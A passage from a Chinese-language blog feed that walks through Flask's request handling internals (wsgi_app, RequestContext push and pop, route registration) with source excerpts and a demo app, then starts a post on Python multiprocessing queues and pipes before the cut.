class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-wsgi-app"><a href="#2-wsgi-app" class="headerlink" title="2.wsgi_app"></a>2.<code>wsgi_app</code></h3><blockquote><p><code>Flask</code> 虽然运行,但是并没有真正的去处理请求,当真正有请求时,是调用<code>Flask.wsgi_app()</code> 去处理</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Flask</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">request_context</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> environ<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> RequestContext<span class="token punctuation">(</span>self<span class="token punctuation">,</span> environ<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">wsgi_app</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span><span class="token punctuation">:</span>  ctx <span class="token operator">=</span> self<span class="token punctuation">.</span>request_context<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>  error <span class="token operator">=</span> None  <span class="token keyword">try</span><span class="token punctuation">:</span>      <span class="token keyword">try</span><span class="token punctuation">:</span>          ctx<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">)</span>          response <span class="token operator">=</span> self<span class="token punctuation">.</span>full_dispatch_request<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>          error <span class="token operator">=</span> e          response <span class="token operator">=</span> self<span class="token punctuation">.</span>handle_exception<span class="token punctuation">(</span>e<span class="token punctuation">)</span>      <span class="token keyword">except</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># noqa: B001</span>          error <span class="token operator">=</span> sys<span class="token punctuation">.</span>exc_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>          <span class="token keyword">raise</span>      <span class="token keyword">return</span> response<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span>  <span class="token keyword">finally</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> self<span class="token punctuation">.</span>should_ignore_error<span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>          error <span class="token operator">=</span> None      ctx<span class="token punctuation">.</span>auto_pop<span class="token punctuation">(</span>error<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python">ctx <span class="token operator">=</span> self<span class="token punctuation">.</span>request_context<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 开始就进行了 请求上下文</span><span class="token comment" spellcheck="true"># 这个方法同样定义在Flask中,引用的是 RequestContext</span><span class="token comment" spellcheck="true"># 此方法定义在 flask/ctx.py 中</span><span class="token keyword">class</span> <span class="token class-name">RequestContext</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> app<span class="token punctuation">,</span> environ<span class="token punctuation">,</span> request<span class="token operator">=</span>None<span class="token punctuation">,</span> session<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>  self<span class="token punctuation">.</span>app <span class="token operator">=</span> app  <span class="token comment" spellcheck="true"># 最开始 request 为None</span>  <span class="token keyword">if</span> request <span class="token keyword">is</span> None<span class="token punctuation">:</span>      <span class="token comment" spellcheck="true"># 定义在 flask/app.py中</span>      <span class="token comment" spellcheck="true"># request_class =Request </span>      <span class="token comment" spellcheck="true"># 这个Request,就是 flask/wrappers.py 下的Request类</span>      <span class="token comment" spellcheck="true"># 这个类主要是用来实现路由的.</span>      request <span class="token operator">=</span> app<span class="token punctuation">.</span>request_class<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>  self<span class="token punctuation">.</span>request <span class="token operator">=</span> request  self<span class="token punctuation">.</span>url_adapter <span class="token operator">=</span> None  <span class="token keyword">try</span><span class="token punctuation">:</span>      <span class="token comment" spellcheck="true"># 上下文对象的 url_adapter,主要是将请求中的URL和Map实例中的URL</span>      <span class="token comment" spellcheck="true"># 进行匹配</span>      self<span class="token punctuation">.</span>url_adapter <span class="token operator">=</span> app<span class="token punctuation">.</span>create_url_adapter<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>  <span class="token keyword">except</span> HTTPException <span class="token keyword">as</span> e<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>routing_exception <span class="token operator">=</span> e  self<span class="token punctuation">.</span>flashes <span class="token operator">=</span> None  self<span class="token punctuation">.</span>session <span class="token operator">=</span> session  self<span class="token punctuation">.</span>_implicit_app_ctx_stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  self<span class="token punctuation">.</span>preserved <span class="token operator">=</span> <span class="token boolean">False</span>  self<span class="token punctuation">.</span>_preserved_exc <span class="token operator">=</span> None  self<span class="token punctuation">.</span>_after_request_functions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#全局变量g    </span>@property<span class="token keyword">def</span> <span class="token function">g</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> _app_ctx_stack<span class="token punctuation">.</span>top<span class="token punctuation">.</span>g@g<span class="token punctuation">.</span>setter<span class="token keyword">def</span> <span class="token function">g</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>  _app_ctx_stack<span class="token punctuation">.</span>top<span class="token punctuation">.</span>g <span class="token operator">=</span> value<span class="token keyword">def</span> <span class="token function">copy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">return</span> self<span class="token punctuation">.</span>__class__<span class="token punctuation">(</span>      self<span class="token punctuation">.</span>app<span class="token punctuation">,</span>      environ<span class="token operator">=</span>self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>environ<span class="token punctuation">,</span>      request<span class="token operator">=</span>self<span class="token punctuation">.</span>request<span class="token punctuation">,</span>      session<span class="token operator">=</span>self<span class="token punctuation">.</span>session<span class="token punctuation">,</span>  <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">match_request</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">try</span><span class="token punctuation">:</span>      result <span class="token operator">=</span> self<span class="token punctuation">.</span>url_adapter<span class="token punctuation">.</span>match<span class="token punctuation">(</span>return_rule<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url_rule<span class="token punctuation">,</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>view_args <span class="token operator">=</span> result  <span class="token keyword">except</span> HTTPException <span class="token keyword">as</span> e<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>routing_exception <span class="token operator">=</span> e<span class="token comment" spellcheck="true"># 最主要的是实现了 push 和 pop方法</span><span class="token comment" spellcheck="true"># 将请求上下文绑定到当前上下文</span><span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 获取请求上下文,开始是None</span>  top <span class="token operator">=</span> _request_ctx_stack<span class="token punctuation">.</span>top  <span class="token keyword">if</span> top <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> top<span class="token punctuation">.</span>preserved<span class="token punctuation">:</span>      top<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>top<span class="token punctuation">.</span>_preserved_exc<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 获取应用上下文,开始为None</span>  app_ctx <span class="token operator">=</span> _app_ctx_stack<span class="token punctuation">.</span>top  <span class="token comment" spellcheck="true"># 先创建 application context,并push到堆栈结构</span>  <span class="token keyword">if</span> app_ctx <span class="token keyword">is</span> None <span class="token operator">or</span> app_ctx<span class="token punctuation">.</span>app <span class="token operator">!=</span> self<span class="token punctuation">.</span>app<span class="token punctuation">:</span>      app_ctx <span class="token operator">=</span> self<span class="token punctuation">.</span>app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span>      app_ctx<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>_implicit_app_ctx_stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>app_ctx<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>_implicit_app_ctx_stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>None<span class="token punctuation">)</span>  <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>sys<span class="token punctuation">,</span> <span class="token string">"exc_clear"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      sys<span class="token punctuation">.</span>exc_clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># self是RequestContext对象,其中包含了请求的所有数据</span>  <span class="token comment" spellcheck="true"># push RequestContext 到堆栈结构</span>  <span class="token comment" spellcheck="true"># push当前上下文到堆栈结构中</span>  _request_ctx_stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span>self<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 这是最重要的方法,保证了_request_ctx_stack中永远指向了当前的上下文</span>  <span class="token keyword">if</span> self<span class="token punctuation">.</span>session <span class="token keyword">is</span> None<span class="token punctuation">:</span>      session_interface <span class="token operator">=</span> self<span class="token punctuation">.</span>app<span class="token punctuation">.</span>session_interface      self<span class="token punctuation">.</span>session <span class="token operator">=</span> session_interface<span class="token punctuation">.</span>open_session<span class="token punctuation">(</span>self<span class="token punctuation">.</span>app<span class="token punctuation">,</span> self<span class="token punctuation">.</span>request<span class="token punctuation">)</span>      <span class="token keyword">if</span> self<span class="token punctuation">.</span>session <span class="token keyword">is</span> None<span class="token punctuation">:</span>          self<span class="token punctuation">.</span>session <span class="token operator">=</span> session_interface<span class="token punctuation">.</span>make_null_session<span class="token punctuation">(</span>self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>  <span class="token keyword">if</span> self<span class="token punctuation">.</span>url_adapter <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>match_request<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>刚启动<code>app</code>,应该还没有生成上下文,也就是上下文为<code>{}</code> 的时候,因为我们并没有去访问网页.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">from</span> flask<span class="token punctuation">.</span>globals <span class="token keyword">import</span> _app_ctx_stack<span class="token punctuation">,</span> _request_ctx_stackapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 堆栈结构</span><span class="token keyword">print</span><span class="token punctuation">(</span>_app_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># {}</span><span class="token comment" spellcheck="true"># {}</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>_app_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-路由"><a href="#3-路由" class="headerlink" title="3.路由"></a>3.路由</h3><blockquote><p>现在来看一下路由的形成.</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里<code>route</code> 方法是一个装饰器,具体的实现逻辑在<code>add_url_rule()</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># flask/app.py</span><span class="token keyword">class</span> <span class="token class-name">Flask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># ...</span><span class="token keyword">def</span> <span class="token function">route</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>rule<span class="token punctuation">,</span><span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>   endpoint <span class="token operator">=</span> options<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"endpoint"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>   self<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span>rule<span class="token punctuation">,</span> endpoint<span class="token punctuation">,</span> f<span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span>   <span class="token keyword">return</span> f<span class="token keyword">return</span> decorator  <span class="token comment" spellcheck="true">#  add_url_rule</span>@setupmethod<span class="token keyword">def</span> <span class="token function">add_url_rule</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>rule<span class="token punctuation">,</span>endpoint<span class="token operator">=</span>None<span class="token punctuation">,</span>view_func<span class="token operator">=</span>None<span class="token punctuation">,</span>provide_automatic_options<span class="token operator">=</span>None<span class="token punctuation">,</span><span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> endpoint <span class="token keyword">is</span> None<span class="token punctuation">:</span>   endpoint <span class="token operator">=</span> _endpoint_from_view_func<span class="token punctuation">(</span>view_func<span class="token punctuation">)</span>options<span class="token punctuation">[</span><span class="token string">"endpoint"</span><span class="token punctuation">]</span> <span class="token operator">=</span> endpointmethods <span class="token operator">=</span> options<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"methods"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># ....</span>rule <span class="token operator">=</span> self<span class="token punctuation">.</span>url_rule_class<span class="token punctuation">(</span>rule<span class="token punctuation">,</span> methods<span class="token operator">=</span>methods<span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span>rule<span class="token punctuation">.</span>provide_automatic_options <span class="token operator">=</span> provide_automatic_optionsself<span class="token punctuation">.</span>url_map<span class="token punctuation">.</span>add<span class="token punctuation">(</span>rule<span class="token punctuation">)</span><span class="token keyword">if</span> view_func <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>   old_func <span class="token operator">=</span> self<span class="token punctuation">.</span>view_functions<span class="token punctuation">.</span>get<span class="token punctuation">(</span>endpoint<span class="token punctuation">)</span>   <span class="token keyword">if</span> old_func <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> old_func <span class="token operator">!=</span> view_func<span class="token punctuation">:</span>       <span class="token keyword">raise</span> AssertionError<span class="token punctuation">(</span>           <span class="token string">"View function mapping is overwriting an "</span>           <span class="token string">"existing endpoint function: %s"</span> <span class="token operator">%</span> endpoint       <span class="token punctuation">)</span>   self<span class="token punctuation">.</span>view_functions<span class="token punctuation">[</span>endpoint<span class="token punctuation">]</span> <span class="token operator">=</span> view_func<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它主要的作用是将路由添加到<code>self.url_map</code> 中.通过<code>rule</code> 和<code>endpoint</code> 的对应,可以很方便的访问到网页.</p><p>以上,当执行完<code>ctx.push()</code> 后,<code>Local</code> 对象中已经有数据了,接着执行<code>self.full_dispatch_request</code>,也就是执行视图函数,它的作用是根据请求的<code>url</code>找到对应的蓝本里面的视图函数,并生成一个<code>response</code>对象.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">full_dispatch_request</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>try_trigger_before_first_request_functions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>   request_started<span class="token punctuation">.</span>send<span class="token punctuation">(</span>self<span class="token punctuation">)</span>   rv <span class="token operator">=</span> self<span class="token punctuation">.</span>preprocess_request<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>       rv <span class="token operator">=</span> self<span class="token punctuation">.</span>dispatch_request<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>   rv <span class="token operator">=</span> self<span class="token punctuation">.</span>handle_user_exception<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">return</span> self<span class="token punctuation">.</span>finalize_request<span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">finalize_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> rv<span class="token punctuation">,</span> from_error_handler<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>response <span class="token operator">=</span> self<span class="token punctuation">.</span>make_response<span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>   response <span class="token operator">=</span> self<span class="token punctuation">.</span>process_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span>   request_finished<span class="token punctuation">.</span>send<span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token operator">=</span>response<span class="token punctuation">)</span><span class="token keyword">except</span> Exception<span class="token punctuation">:</span>   <span class="token keyword">if</span> <span class="token operator">not</span> from_error_handler<span class="token punctuation">:</span>       <span class="token keyword">raise</span>   self<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>exception<span class="token punctuation">(</span>       <span class="token string">"Request finalizing failed with an error while handling an error"</span>   <span class="token punctuation">)</span><span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后,会清空堆栈结构中的数据,为下一次的上下文做准备.</p><pre class="line-numbers language-python"><code class="language-python">ctx<span class="token punctuation">.</span>auto_pop<span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># auto_pop中实现了 ResponseContext.pop()方法.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="4-发起访问"><a href="#4-发起访问" class="headerlink" title="4.发起访问"></a>4.发起访问</h3><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">from</span> flask<span class="token punctuation">.</span>globals <span class="token keyword">import</span> _app_ctx_stack<span class="token punctuation">,</span> _request_ctx_stackapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 堆栈结构</span><span class="token keyword">print</span><span class="token punctuation">(</span>_app_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># {}</span><span class="token comment" spellcheck="true"># {}</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>_app_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在浏览器中发起访问<code>http://127.0.0.1:5000/?username=python</code></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token operator">&lt;</span>greenlet.greenlet object at 0x7f0b30a17260<span class="token operator">></span>: <span class="token punctuation">{</span><span class="token string">'stack'</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>flask.ctx.AppContext object at 0x7f0b30a1e210<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>greenlet.greenlet object at 0x7f0b30a17260<span class="token operator">></span>: <span class="token punctuation">{</span><span class="token string">'stack'</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>RequestContext <span class="token string">'http://127.0.0.1:5000/?username=python'</span> <span class="token punctuation">[</span>GET<span class="token punctuation">]</span> of app<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到其中有一个<code>RequestContext</code> 对象.当真正发起访问<code>http://127.0.0.1:5000/?username=python</code> ,就会调用<code>Flask.wsgi_app()</code> ,此时调用了<code>RequestContext.push(self)</code> ,也就是当前上下文被<code>push</code> 到了<code>__request_ctx_stack</code> 堆栈结构中.这就是上下文结构.</p><p>当访问结束后,<code>ctx.auto_pop(error)</code>会清空堆栈结构.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python进程线程:使用PIPE交换数据</title>
      <link href="/posts/38467.html"/>
      <url>/posts/38467.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="进程之间交换对象"><a href="#进程之间交换对象" class="headerlink" title="进程之间交换对象"></a>进程之间交换对象</h2><blockquote><p>并行:同一时刻有多条指令在多个CPU上运行.</p><p>并行时常常需要进程之间交换数据,<code>multiprocessing</code> 模块提供了2个<code>communication channels</code> 来交换数据:队列<code>queue</code> 和管道<code>pipe</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-22/1603375718961-communication-channel.png"></p><p>除了上面两种交换数据的方式之外,进程之间也可以使用同步原语进行数据交换,但是要尽可能的避免使用同步原语,例如锁.因为<code>queue</code>和<code>pipe</code>效率上更高,更加安全.</p></blockquote><h3 id="1-使用队列queue-来交换数据"><a href="#1-使用队列queue-来交换数据" class="headerlink" title="1.使用队列queue 来交换数据"></a>1.使用队列<code>queue</code> 来交换数据</h3><blockquote><p><code>queue</code> 是多进程安全的队列,可以使用<code>queue</code> 来实现多进程之间的数据传递.</p><ul><li><code>put</code> :此方法用来插入数据队列中,可选参数有两个:<code>blocked\timeout</code><ul><li>如果<code>blocked=True</code>(默认值),并且<code>timeout</code> 为正数,该方法会阻塞<code>timeout</code> 指定时间.直到该队列有剩余的空间.如果超时,会抛出<code>Queue.Full</code>异常</li><li>如果<code>blocked=False</code>,但是该队列已满,会抛出<code>Queue.Full</code>异常</li></ul></li><li><code>get</code> :此方法可以从队列读取并删除一个元素.可选参数有2个:<code>blocked\timeout</code><ul><li>如果<code>blocked=True</code>(默认值),并且<code>timeout</code> 为正数,那么在等待时间内没有取到任何元素,会抛出<code>Queue.Empty</code>异常</li><li>如果<code>blocked=False</code>,如果<code>queue</code> 有一个值可用,立即返回该值,否则,队列为空,会立即抛出异常<code>Queue.Empty</code></li></ul></li></ul><p>常用属性和方法:</p><table><thead><tr><th><code>qsize()</code></th><th>返回队列的大小</th></tr></thead><tbody><tr><td><code>empty()</code></td><td>返回布尔值,队列是否为空</td></tr><tr><td><code>full()</code></td><td>返回布尔值,队列是否满了</td></tr><tr><td><code>put(item[,block[,timeout]])</code></td><td>在队列中添加元素<code>item</code></td></tr><tr><td><code>put_nowait(item)</code></td><td>等价与<code>put(item, 